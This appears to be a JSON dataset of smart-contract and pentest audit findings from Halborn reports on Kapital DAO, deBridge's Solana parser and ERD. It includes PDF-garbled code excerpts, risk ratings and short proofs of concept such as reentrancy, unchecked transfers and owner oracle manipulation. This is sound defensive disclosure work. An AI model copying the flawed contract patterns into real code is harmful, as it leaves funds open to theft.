        "body": "In RewardsLocker.sol, Staking.sol, Vesting.sol contracts, return values from external transfer calls are not checked. It should be noted that the token is not reverted on failure and returns false. If one of these tokens is used, a deposit would not be reverted if the transfer failed and an attacker could deposit tokens for free. Code Location: Listing 4: RewardsLocker.sol (Line 107) function collectRewards ( uint256 lockAgreementId ) external { 91 92  sender ][ 93 94 95  rewards 96 97 98 99 100 LockAgreement storage lockAgreement = lockAgreements [ msg . lockAgreementId ]; // make sure the beneficiary waits before collecting the require ( block . timestamp >= lockAgreement . availableTimestamp , \" Collection too early \" ); // make sure the beneficiary has not already collected the  rewards 101 102 require (! lockAgreement . collected , \" Already collected \"); // set ` collected ` to true , so the beneficiary cannot  withdraw again 103 104 105 106 107 108 } lockAgreement . collected = true ; // update voting weight weightKAP [ msg . sender ] -= lockAgreement . amount ; // transfer ` amount ` KAP to the beneficiary kapToken . transfer ( msg . sender , lockAgreement . amount ); 20 Listing 5: RewardsLocker.sol (Line 120) 115 116 117 118 function transferKap ( address to , uint256 amount ) external { bool senderIsGovernance = ( msg . sender == governanceRegistry . governance () ); bool authorized = senderIsGovernance || hasRole ( KAP_SAVER ,  msg . sender ); 119 120 121 } require ( authorized , \" Access denied \" ); kapToken . transfer ( to , amount ); Listing 6: Staking.sol (Line 456) 451 452 453 454 455 456 457 458 function _transferFromAndReturnAddAmount ( address staker , uint256 inputAmount ) internal returns ( uint256 ) { uint256 previousBalance = asset . balanceOf ( address ( this )) ; asset . transferFrom ( staker , address ( this ) , inputAmount ); return asset . balanceOf ( address ( this )) - previousBalance ; } Listing 7: Staking.sol (Line 248) 226 function unstake ( uint256 removeAmount , uint256  stakingAgreementId ) 227 228 229 external { // update { multipliedTotalRewardsPerWeightLastSync } if  necessary 230 231 232 233 234 235 if ( block . timestamp > lastSync ) { sync () ; } Staker storage staker = stakers [ msg . sender ]; StakingAgreement storage stakingAgreement = staker .  stakingAgreements [ 236 237 238 239 240 stakingAgreementId ]; require ( ( removeAmount > 0) && ( removeAmount <=  stakingAgreement . amount ) , 21 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 \" Staking : Invalid amount \" ); require ( block . timestamp >= stakingAgreement . lockEnd , \" Staking : Too early \" ); asset . transfer ( msg . sender , removeAmount ); staker . totalAmount -= Math . toUint112 ( removeAmount ); stakingAgreement . amount -= Math . toUint112 ( removeAmount ); uint256 unstakeWeight = _calculateStakeWeight ( stakingAgreement . lockEnd - stakingAgreement . lockStart , removeAmount ); totalStakingWeight -= unstakeWeight ; staker . totalWeight -= Math . toUint136 ( unstakeWeight ); // looking at { claimRewards }, the above line has  instantaneously 259 260 // decreased ` claimedRewards ` by // `( unstakeWeight *  multipliedTotalRewardsPerWeightLastSync ) /  REWARDS_PER_WEIGHT_MULTIPLIER `. 261 // we therefore need to give this amount back to the user  in the form 262 263 264 // of adding to ` staker . addRewards `. staker . addRewards += ( unstakeWeight *  multipliedTotalRewardsPerWeightLastSync ) / REWARDS_PER_WEIGHT_MULTIPLIER ; emit Unstake ( msg . sender , removeAmount ); } 265 266 267 268 Listing 8: Vesting.sol (Line 132) function collect ( uint256 vestingAgreementId ) external { VestingAgreement storage vestingAgreement = 95 96  vestingAgreements [ 97 98 99 100 101 msg . sender ][ vestingAgreementId ]; // make sure the vesting period has started require ( block . timestamp > vestingAgreement . vestStart , 22 102 103 104 105 106 \" Vesting not started \" ); // calculate portion of ` totalAmount ` currently unlocked uint256 amountUnlocked ; // if { VESTING_PERIOD } has passed , the entire ` totalAmount  ` is unlocked 107 if ( block . timestamp >= ( vestingAgreement . vestStart +  VESTING_PERIOD )) { 108 109 110 amountUnlocked = vestingAgreement . totalAmount ; } // otherwise , we find the portion of ` totalAmount `  currently available 111 112 113 114  ) / 115 116 117 else { amountUnlocked = ( vestingAgreement . totalAmount * ( block . timestamp - vestingAgreement . vestStart ) VESTING_PERIOD ; } // make sure some of ` amountUnlocked ` has not yet been  collected 118 119 120 121 122 123 124 125 126 127 128 129 require ( amountUnlocked > vestingAgreement . amountCollected , \" Collection limit reached \" ); // calculate amount available for collection uint256 collectionAmount = amountUnlocked - vestingAgreement . amountCollected ; // update balance balances [ msg . sender ] -= collectionAmount ; // update voting weight weightKAP [ delegates [ msg . sender ]] -= collectionAmount ; // update vesting agreement to indicate a collection has  been performed 130 vestingAgreement . amountCollected += SafeCast . toUint96 (  collectionAmount ); 131 132 133 } // transfer KAP tokens available for collection kapToken . transfer ( msg . sender , collectionAmount ); 23 Listing 9: Vesting.sol (Line 75) 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 function createVestingAgreement ( address beneficiary , uint256 vestStart , uint256 amount ) external onlyRole ( VESTING_CREATOR ) { // caller provides KAP for the vesting agreement kapToken . transferFrom ( msg . sender , address ( this ) , amount ); // update balance balances [ beneficiary ] += amount ; // update delegate voting weight weightKAP [ delegates [ beneficiary ]] += amount ; // push a new vesting agreement for the beneficiary vestingAgreements [ beneficiary ]. push ( VestingAgreement ({ vestStart : SafeCast . toUint64 ( vestStart ) , totalAmount : SafeCast . toUint96 ( amount ) , amountCollected : SafeCast . toUint96 (0) }) ); } Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to use SafeERC20 or make sure the return values of transfer and transferFrom are checked. For example, the success check below can ensure a revert on failure. Listing 10 bool success = asset . transferFrom ( staker , address ( this ) , 1  inputAmount ); 2 3 4 } if (! success ) { revert TransferFailed () ; 24 Remediation Plan: SOLVED: The Playground labs team solved the above issue in commit As a result, the team now 35fb92524b83ff8197a7127f7c9819317ac7ea92. uses OpenZeppelins SafeERC20 to perform the transfers. However, the team claims that the tokens used in the Kapital DAO (KAP token and Uniswap V2 Pair) revert on failure, and otherwise return a hardcoded value of true in the above code. 25 ",
        "labels": [
            "Halborn",
            "PlayGround_Labs_Kapital_DAO",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "One of the contracts included in the scope of Playground Labs Kapital- DAO was identified as missing a nonReentrant guard. In this function, persistent state read/write after an external call is identified, making it vulnerable to a Reentrancy attack.  The Staking.sol contract function unstake is missing nonReentrant guard. To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit OpenZeppelin has its own mutex the function with a recursive call. implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Code Location: Listing 11: Staking.sol (Lines 248,249,256,257,263-265) 226 function unstake ( uint256 removeAmount , uint256  stakingAgreementId ) 227 228 229 external { // update { multipliedTotalRewardsPerWeightLastSync } if  necessary 230 231 232 233 234 235 if ( block . timestamp > lastSync ) { sync () ; } Staker storage staker = stakers [ msg . sender ]; StakingAgreement storage stakingAgreement = staker .  stakingAgreements [ 236 stakingAgreementId 26 237 238 239 240 ]; require ( ( removeAmount > 0) && ( removeAmount <=  stakingAgreement . amount ) , 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 \" Staking : Invalid amount \" ); require ( block . timestamp >= stakingAgreement . lockEnd , \" Staking : Too early \" ); asset . transfer ( msg . sender , removeAmount ); staker . totalAmount -= Math . toUint112 ( removeAmount ); stakingAgreement . amount -= Math . toUint112 ( removeAmount ); uint256 unstakeWeight = _calculateStakeWeight ( stakingAgreement . lockEnd - stakingAgreement . lockStart , removeAmount ); totalStakingWeight -= unstakeWeight ; staker . totalWeight -= Math . toUint136 ( unstakeWeight ); // looking at { claimRewards }, the above line has  instantaneously 259 260 // decreased ` claimedRewards ` by // `( unstakeWeight *  multipliedTotalRewardsPerWeightLastSync ) /  REWARDS_PER_WEIGHT_MULTIPLIER `. 261 // we therefore need to give this amount back to the user  in the form 262 263 264 // of adding to ` staker . addRewards `. staker . addRewards += ( unstakeWeight *  multipliedTotalRewardsPerWeightLastSync ) / REWARDS_PER_WEIGHT_MULTIPLIER ; emit Unstake ( msg . sender , removeAmount ); } 265 266 267 268 Risk Level: Likelihood - 1 27 Impact - 4 Recommendation: Change the code to follow the checks-effects-interactions pattern and use ReentrancyGuard via the nonReentrant modifier. Remediation Plan: SOLVED: The Playground labs team solved the above issue in commit As a result, the code now 35fb92524b83ff8197a7127f7c9819317ac7ea92. However, the team follows the checks-effects-interactions pattern. claims that the tokens used in Kapital DAO (KAP token and Uniswap V2 Pair) are not vulnerable to reentrancy into above code. 28 ",
        "labels": [
            "Halborn",
            "PlayGround_Labs_Kapital_DAO",
            "Severity: Low"
        ]
    },
    {
        "title": "UNINITIALIZED PROPOSE COOLDOWN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Governance.sol contract, the proposeCooldown state variable is not initialized, it defaults to 0 value, and the variable is considered in the other calculation progresses, i.e., require( timestamp >= latestPropose [msg.sender] + proposeCooldown, \"Governance: Propose Cooldown\"); in the propose function. If a variable must be initialized to zero, explicitly set it to zero to improve code readability. Code Location: Listing 12: Governance.sol (Line 23) 23 uint24 public proposeCooldown ; Listing 13: Governance.sol (Line 154) 138 139 140 141 142 143 144 145 146 function propose ( address [] memory targets , uint256 [] memory values , bytes [] memory data , bool [] memory isDelegateCall , WeightSources memory weightSources ) external returns ( uint256 ) { // Ensure msg . sender has enough voting weight ( uint256 weightKAP , uint256 weightLP ) = getWeights (  weightSources ); 147 148 149 150 151 require ( weightKAP + convertLP ( weightLP ) >= threshold , \" Governance : Insufficient weight \" ); // Make sure haven 't already created a proposal within  cooldown period , Propose CoolDown 152 153 uint256 timestamp = block . timestamp ; require ( 29 154 timestamp >= latestPropose [ msg . sender ] +  proposeCooldown , 155 156 157 158 \" Governance : Propose Cooldown \" ); // Add new proposal Risk Level: Likelihood - 3 Impact - 2 Recommendation: If is recommended to initialize all variables in the same function, either in the constructor or in a custom init method. However, using uninitialized variables and expecting them to have a value could cause unexpected behaviors in the flow of execution. Remediation Plan: SOLVED: The Playground labs team solved the above issue in the commit As a result, the team ini- 35fb92524b83ff8197a7127f7c9819317ac7ea92. tializes proposeCooldown to 3 days (same as the voting period) so that the voting process is never overwhelmed by repeated proposals. Listing 14: Constructor Initialize propseCooldown 1 2 // implicitly set propseCooldown to be the voting period proposeCooldown = _waitTo . endVote - _waitTo . startVote ; 30 ",
        "labels": [
            "Halborn",
            "PlayGround_Labs_Kapital_DAO",
            "Severity: Low"
        ]
    },
    {
        "title": "EXTERNAL FUNCTION CALLS WITHIN LOOP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "External calls within a loop increase Gas usage or can lead to a denial of service attack. In the Governance.sol contract functions discovered there is a for loop on the i variable that iterates through the weightSources .kapSources.length and weightSources.lpSources.length array length, and this loop has external calls within a loop. If this integer evaluates to extremely large numbers, this can cause a DoS. Code Location: Listing 15: Governance.sol (Lines 104,96-98) function getWeights ( WeightSources memory weightSources ) public view returns ( uint256 weightKAP , uint256 weightLP ) { 88 89 90 91 92 93 94  ++) { 95 96  weightKAP ( 97 98 99 100 101 102 // Calc KAP voting weight for ( uint256 i = 0; i < weightSources . kapSources . length ; i if ( weightSources . kapSources [i ]) { weightKAP += IKAPSource ( weightSourcesKAP [ i ]) . msg . sender ); } } // Calc LP voting weight for ( uint256 i = 0; i < weightSources . lpSources . length ; i  ++) { 103 104 if ( weightSources . lpSources [ i ]) { weightLP += ILPSource ( weightSourcesLP [ i ]) . weightLP  ( msg . sender ); } 105 106 107 } } 31 Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended that you set the maximum length over which a for loop can iterate. If possible, use the pull over push strategy for external calls. Reference: External Calls Recommendation Remediation Plan: SOLVED: The Playground labs team solved the above issue in commit 35fb92524b83ff8197a7127f7c9819317ac7ea92. the WeightSources and getWeights structs; as a result, the user can now choose specific array indices in weightSourcesKAP and weightSourcesLP . the team added that in the unlikely case that weightSourcesKAP and weightSourcesLP are very long, the user can choose a relatively small number of WeightSources to loop through. Furthermore, modifies team The 32 ",
        "labels": [
            "Halborn",
            "PlayGround_Labs_Kapital_DAO",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORE RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The return value of an external call is not stored in a local or state variable. In the Transactor.sol contract, there is an instance where an external method is called, and the return value is ignored. Code Location: Listing 16: Transactor.sol (Lines 39,41) function _transact ( address [] memory targets , uint256 [] memory values , bytes [] memory data , bool [] memory isDelegateCall ) internal { require ( targets . length > 0, \" Invalid array length \"); require ( targets . length == values . length , \" Array length require ( targets . length == data . length , \" Array length require ( targets . length == isDelegateCall . length , \" Array length mismatch \" for ( uint256 i = 0; i < targets . length ; i ++) { if ( isDelegateCall [ i ]) { Address . functionDelegateCall ( targets [ i ], data [ i ]) ; } else { Address . functionCallWithValue ( targets [ i], data [ i], } 33 23 24 25 26 27 28 29 30  mismatch \" ); 31  mismatch \" ); 32 33 34 35 36 37 38 39 40 41  values [ i ]) ; 42 43 44 ); } } Risk Level: Likelihood - 3 Impact - 2 Recommendation: Add return value checking to prevent an unexpected contract crash. Check- ing the return value will help to handle exceptions in a better way. Remediation Plan: RISK ACCEPTED: The Playground labs team accept the risk of this finding. Furthermore, the team claims that the team does not have any function- specific return value due to not having information about which functions can be called in advance. However, the team added that the Address contract confirms that success == true and reverts otherwise. 34 ",
        "labels": [
            "Halborn",
            "PlayGround_Labs_Kapital_DAO",
            "Severity: Low"
        ]
    },
    {
        "title": "WEAK GOVERNANCE OWNERSHIP TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The supplied newGovernance is not being validated before the transfer of ownership, even though the governance access control is in place. If configured incorrectly, it will lock all governance functionality. PoC Steps: Listing 17: GovernanceRegistry.sol (Lines 29,30) 28 29 30 31 function changeGovernance ( address newGovernance ) external { require ( msg . sender == governance , \" Only governance \" ); governance = newGovernance ; } Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider validating that the new governance address is different from address zero. Furthermore, two-step approvals must be set to avoid setting the wrong addresses. The first function will store an address in a global variable, and the second function will confirm the new address if msg.sender equals the new address, proving that the new owner has access to the correct private key. 35 Remediation Plan: SOLVED: The Playground labs team solved the above issue in commit As a result, the team added 35fb92524b83ff8197a7127f7c9819317ac7ea92. a two-step governance change process. Furthermore, the team also added additional validation of the new governance address. Listing 18: Updated changeGovernance function changeGovernance ( address newGovernance ) external { require ( msg . sender == governance , \" Only governance \" ); require ( newGovernance != address (0) && newGovernance != \" Invalid governance \" IGovernance _newGovernance = IGovernance ( newGovernance ); require ( _newGovernance . votingPeriod () > 0) ; appointedNewGovernance = newGovernance ; 1 2 3 4  governance , 5 6 7 8 9 10 11 12 ); } 36 ",
        "labels": [
            "Halborn",
            "PlayGround_Labs_Kapital_DAO",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING LEGITIMACY OF VOTE CASTER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Governance.sol contract, it is noted that the vote function lacks the legitimacy of msg.sender if it is a valid voter. As a result, an unknown EOA or contract may cast a vote; therefore, the result of the vote can be manipulated, although it is unlikely since there are no benefits for said voter. Code Location: Listing 19: Governance.sol 197 198 199 200 201 202 203 204 205 function vote ( uint256 proposalID , bool yay , WeightSources memory weightSources ) external { Proposal storage proposal = proposals [ proposalID ]; // Enforce voting window , Voting Window require ( _checkVoteWindow ( proposal ) , \" Governance : Voting  window \"); 206 207 208 // Mark msg . sender as having voted , Already Voted require (! proposal . hasVoted [ msg . sender ], \" Governance :  Already voted \" ); 209 210 211 proposal . hasVoted [ msg . sender ] = true ; ( uint256 weightKAP , uint256 weightLP ) = getWeights (  weightSources ); 212 213 214 // Add to vote counts require ( weightLP <= type ( uint112 ). max , \" Governance :  uint112 ( weightLP ) \" ); 215 216 217 if ( yay ) { proposal . yaysKAP += SafeCast . toUint96 ( weightKAP ); proposal . yaysLP += uint112 ( weightLP ); 37 218 219 220 221 222 223 224 225 226 } else { proposal . naysKAP += SafeCast . toUint96 ( weightKAP ); proposal . naysLP += uint112 ( weightLP ); } // Record that ` msg . sender ` last voted at this timestamp lastVoted [ msg . sender ] = block . timestamp ; emit Voted ( msg . sender , proposalID , yay , weightKAP ,  weightLP ); } 227 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to implement a valid whitelist of members who can cast Otherwise, validate msg.sender and ensure that a vote on a proposal. only valid EOA interacts with purpose. Consider adding the validSender modifier below to avoid the above issue. Listing 20 function isContract () public view returns ( bool ){ uint32 size ; address a = msg . sender ; assembly { size := extcodesize ( a ) } require ( size ==0) ; 1 2 3 4 5 6 7 8 9 10 11 12  \" Only - EOA \" ); 13 _ ; } modifier validSender ( address sender ) { require (! sender . isContract () && ( tx . origin == msg . sender ) , 38 14 } Remediation Plan: requirement descriptive As a solution, SOLVED: The Playground labs team solved the above issue in commit 35fb92524b83ff8197a7127f7c9819317ac7ea92. the team a require(weightKAP > 0 || weightLP > 0, \" Governance: Zero weight\") to prevent zero-weight accounts from voting Furthermore, the team claims that the team allows unnecessarily. contracts, particularly multisig wallets, to stake and vote. And the only requirement to propose is to meet the threshold that the team has currently initialized at 0.65% of the total KAP supply, and there is no whitelist of proposals. 39 ",
        "labels": [
            "Halborn",
            "PlayGround_Labs_Kapital_DAO",
            "Severity: Low"
        ]
    },
    {
        "title": "USAGE OF BLOCK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Labs Kapital-DAO contracts were observed. During a manual review, the use of block.timestamp in some Playground Contract developers should note that this does not mean the current time. Miners can influence the value of block.timestamp to some degree, so testers should be warned that this may come at some risk if miners collude in time manipulation to influence price oracles. It is important to follow the 15-second rule, i.e., if the contract is not based on an interval of less than 15-seconds, it is fine to use block.timestamp. Code Location: Listing 21: Vesting.sol 1 #101: block . timestamp > vestingAgreement . vestStart , 2 #107: if ( block . timestamp >= ( vestingAgreement . vestStart +  VESTING_PERIOD )) { 3 #114: ( block . timestamp - vestingAgreement . vestStart )) / 4 #148: block . timestamp > oldDelegateLastVoted + votingPeriod , Listing 22: Governance.sol 1 #152: uint256 timestamp = block . timestamp ; 2 #187: uint256 timeElapsed = block . timestamp - proposal . proposeTime  ; 3 #224: lastVoted [ msg . sender ] = block . timestamp ; 4 #239: uint256 timeElapsed = block . timestamp - proposal . proposeTime  ; 5 #323: emit ProposalExecuted ( msg . sender , proposalID , block .  timestamp ); 6 #350: ( block . timestamp - proposal . proposeTime ); 40 Listing 23: Staking.sol 1 #148: ( block . timestamp <= ( lastStaked [ voter ] + votingPeriod )) 2 #161: if ( block . timestamp <= rewardsStart ) { 3 #182: if ( block . timestamp > lastSync ) { 4 #185: lastStaked [ msg . sender ] = block . timestamp ; 5 #230: if ( block . timestamp > lastSync ) { 6 #244: block . timestamp >= stakingAgreement . lockEnd , 7 #288: if ( block . timestamp > lastSync ) { 8 #295: if ( block . timestamp <= rewardsStart ) { 9 #320: require ( block . timestamp > lastSync , \" Staking : Already syncd \"  ); 10 #323: if ( block . timestamp > rewardsRules [ rewardsRuleIndex ]. timeEnd  ) { 11 #419: if ( block . timestamp <= rewardsRule . timeEnd ) { 12 #470: uint256 lockStart = block . timestamp <= rewardsStart Listing 24: RewardsLocker.sol 1 #97: block . timestamp >= lockAgreement . availableTimestamp , Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to follow the 15-second rule, i.e., if the time- dependent event can vary by 15 seconds and maintain integrity, it is safe to use a block.timestamp. Reference: Ethereum Yellow Paper 41 Remediation Plan: RISK ACCEPTED: The Playground labs team accepted the risk of this finding. 42 3.10 (HAL-10) MISSING ZERO-ADDRESS CHECK - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "PlayGround_Labs_Kapital_DAO",
            "Severity: Informational"
        ]
    },
    {
        "title": "LOGS WITH NEWLINE CANNOT BE PARSED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Debridge_solana_tx_parser_Whitebox_Pentest_Report_Halborn_Final.pdf",
        "body": "Solana supports log messages with newline character \\n. However, it was observed that solana-tx-parser cannot parse such logs. If a user sends a transaction to a program that emits a log message in which there is a new line character, the library will reject such transaction and will not parse it, even if all following logs contain only flat messages without newlines. Code location: Listing 1: solana-tx-parser/src/helpers.ts (Line 161) 160 if ( !match || !match . groups ) { 161 162 } throw new Error ( ` Failed to parse log line : $ { log } `) ; Risk Level: Likelihood - 3 Impact - 4 Proof Of Concept: 1. Create a program with an instruction handler that contains the following code: Listing 2: (Line 12) 11 pub fn some_instruction ( ctx : Context < Context >) -> Result <() > { 12 13 14 } msg! ( \" Log with new line \\ n \"); Ok (() ) 13 2. Deploy the program and send a transaction targeting that handler. Observe that the instruction is executed correctly and the following log message was emitted: Listing 3: (Line 17) Program log : Instruction : InitializeSendBridge Program log : Log with new line 14 Program ChtRDTGjhUYubbavybASVJv3h7ZsfDzURvPFemgfRbcb invoke [1] 15 16 17 18  5226 of 200000 compute units 19 Program ChtRDTGjhUYubbavybASVJv3h7ZsfDzURvPFemgfRbcb success Program ChtRDTGjhUYubbavybASVJv3h7ZsfDzURvPFemgfRbcb consumed 3. Try to parse the transaction with solana-tx-parser and observe that the parser throws an error. Recommendation: It is recommended to gracefully handle parsing transactions with log messages that span over multiple lines and which including the newline character. Remediation Plan: The parsing fixed SOLVED: regex multiline 63fdd1afbae5f0ae2788e0f77ce5616d05415f54. DeBridge team accept to this issue by messages log changing in the commit 14 ",
        "labels": [
            "Halborn",
            "Debridge_solana_tx_parser_Whitebox_Pentest",
            "Severity: Medium"
        ]
    },
    {
        "title": "TRUNCATED LOGS CANNOT BE PARSED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Debridge_solana_tx_parser_Whitebox_Pentest_Report_Halborn_Final.pdf",
        "body": "Such logs appear as Solana truncates log messages that are too long. Log truncated in transaction log trail. However, it was observed that solana-tx-parser cannot parse such logs. If a user supplies a transaction to a program that emits a truncated log message, such transaction will be rejected and will not be able to be parsed by the library. Code location: Listing 4: solana-tx-parser/src/helpers.ts (Line 161) 160 if ( !match || !match . groups ) { 161 162 } throw new Error ( ` Failed to parse log line : $ { log } `) ; Listing 5: solana-tx-parser/src/helpers.ts (Line 151) 150 const parserRe = 151 /(? < programInvoke >^ Program (? < invokeProgramId >[1 -9 A - HJ - NP - Za -  km - z ]{32 ,}) invoke \\[(? < level >\\ d +) \\] $ ) |(? < programSuccessResult >^  Program (? < successResultProgramId >[1 -9 A - HJ - NP - Za - km -z ]{32 ,})  success$ ) |(? < programFailedResult >^ Program (? < failedResultProgramId  >[1 -9 A -HJ -NP -Za -km -z ]{32 ,}) failed : (? < failedResultErr >.*) $ ) |(? <  programCompleteFailedResult >^ Program failed to complete : (? <  failedCompleteError >.*) $) |(? < programLog >^^ Program log : (? <  logMessage >.*) $ ) |(? < programData >^ Program data : (? < data >.*) $ ) |(? <  programConsumed >^ Program (? < consumedProgramId >[1 -9 A -HJ -NP -Za -km -z  ]{32 ,}) consumed (? < consumedComputeUnits >\\ d *) of (? <  allComputedUnits >\\ d *) compute units$ ) |(? < programReturn >^ Program  return : (? < returnProgramId >[1 -9 A -HJ -NP - Za - km - z ]{32 ,}) (? <  returnMessage >.*) $ ) /; 152 const result : LogContext [] = []; 15 Proof Of Concept: 1. Create a program with instruction handler that contains the following code: Listing 6: (Line 12) 11 pub fn some_instruction ( ctx : Context < Context >) -> Result <() > { 12 13 14 } msg! ( \"{ PUT LONG STRING HERE , AT LEAST 10 000 characters } \"); Ok (() ) 2. Deploy the program and send a transaction targeting that handler. Observe that the instruction is correctly executed, and the following log message was emitted: Listing 7: (Line 17) Program ChtRDTGjhUYubbavybASVJv3h7ZsfDzURvPFemgfRbcb invoke Log Messages : 14 15  [1] 16 17 18  18594 of 200000 compute units 19 Program log : Instruction : InitializeSendBridge Log truncated Program ChtRDTGjhUYubbavybASVJv3h7ZsfDzURvPFemgfRbcb consumed Program ChtRDTGjhUYubbavybASVJv3h7ZsfDzURvPFemgfRbcb success 3. Try to parse the transaction with solana-tx-parser and observe that the parser throws an error. Risk Level: Likelihood - 2 Impact - 4 16 Recommendation: It is recommended to gracefully handle parsing transactions with log messages that are truncated by the Solana runtime. Remediation Plan: SOLVED: The DeBridge team fixed this issue by changing parsing logic to handle truncated logs in commit 63fdd1afbae5f0ae2788e0f77ce5616d05415f54. 17 ",
        "labels": [
            "Halborn",
            "Debridge_solana_tx_parser_Whitebox_Pentest",
            "Severity: Medium"
        ]
    },
    {
        "title": "PRICE MANIPULATION RISK IN STETHORACLE CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ERD_Ethereum_Reserve_Dollar_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "If the owners private key of the contract StETHOracle.sol gets stolen, or the owner himself acts maliciously, it is possible to directly manipulate the price oracle by calling the setPrice() function and updating the lastGoodPrice storage variable without using Chainlink. Hence, all parts of the protocol using fetchPrice_view() would get as a result an incorrect price for the token. Code Location: Listing 1: StETHOracle.sol (Line 339) 338 function setPrice ( uint _price ) external onlyOwner { 339 340 341 } lastGoodPrice = _price ; emit LastGoodPriceUpdated ( _price ); Listing 2: StETHOracle.sol (Line 139) 138 function fetchPrice_view () external view override returns ( uint256  ) { 139 140 } return lastGoodPrice ; 20 Proof of Concept: 1. The owner calls setPrice() and significantly decreases the token price. 2. All active troves now have ICR < MCR, hence can be liquidated. 3. Liquidate all troves and distribute all the rewards. 4. Set the correct token price again. BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:N/D:M/Y:M/R:P/S:U (5.0) Recommendation: Updating the lastGoodPrice storage variable is only recommended by re- questing it to Chainlink and checking if the response is acceptable. Remediation Plan: SOLVED: The ERD team solved the issue with the following commit ID. Commit ID : 6657817edcc30b48e41836756a3f41fa34ef779d 21 ",
        "labels": [
            "Halborn",
            "ERD_Ethereum_Reserve_Dollar",
            "Severity: Medium"
        ]
    },
    {
        "title": "NON",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ERD_Ethereum_Reserve_Dollar_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The owner of the Migrations.sol contract is set in the constructor() and cannot be changed anymore. If there is any issue with the owner account, the contract can be left useless without being able to change the ownership to a new address. Code Location: Listing 3: Migrations.sol (Line 14) 13 constructor () { 14 15 } owner = msg . sender ; Listing 4: Migrations.sol (Line 10) 9 modifier restricted () { 10 11 } if ( msg . sender == owner ) _; BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:M/D:N/Y:N/R:P/S:U (2.5) Recommendation: The use of Ownable contract from OpenZeppelin is recommended to handle the ownership of the contract. 22 Remediation Plan: SOLVED: The ERD team solved the issue with the following commit ID. Commit ID : 95ad8f438291ec082f34dab97dc57ecf2494209c 23 ",
        "labels": [
            "Halborn",
            "ERD_Ethereum_Reserve_Dollar",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE DOS DUE TO COLLATERALMANAGER.COLLATERALSUPPORT SIZE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ERD_Ethereum_Reserve_Dollar_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The owner of the CollateralManager.sol contract can add new collateral tokens which will be supported by the protocol. When adding support for new collaterals, there is no limit for the current amount of collaterals supported, and as the addresses of the collaterals are pushed to an array (collateralSupport), the size of this array can grow considerably over time. Hence, when the protocol calls priceUpdate() to update the price of all collaterals supported by the protocol, it iterates over all the collaterals fetching their price from their oracles. In the case the size of the array has grown significantly, it could be possible the price update will revert due to reaching the transaction gas limit. Code Location: Listing 5: CollateralManager.sol (Line 127) address _collateral , address _oracle , address _eTokenAddress , uint256 _ratio 111 function addCollateral ( 112 113 114 115 116 ) external override onlyOwner { 117 118 119 120 121 122 123 124 125 _ratio , _eTokenAddress , _oracle , DataTypes . CollStatus (1) , collateralsCount require (! getIsSupport ( _collateral ) , Errors . CM_COLL_EXISTS ); _requireRatioLegal ( _ratio ); collateralParams [ _collateral ] = DataTypes . CollateralParams ( 24 126 127 128 129 } ); collateralSupport . push ( _collateral ); collateralsCount = collateralsCount . add (1) ; Listing 6: CollateralManager.sol (Line 246) 242 function priceUpdate () public override { 243 if ( collateralsCount < 2) { 244 245 246 247 } for ( uint256 i = 1; i < collateralsCount ; ) { return ; IOracle ( collateralParams [ collateralSupport [ i ]]. oracle ).  fetchPrice () ; unchecked { i ++; } } 248 249 250 251 252 } BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:C/D:N/Y:N/R:P/S:U (1.0) Recommendation: It is strongly recommended to set a cap for the amount of collaterals supported by the protocol. Remediation Plan: SOLVED: The ERD team solved the issue with the following commit ID. Commit ID : 93c803ae22a7676e05a1fa6ec884589de28fd619 25 ",
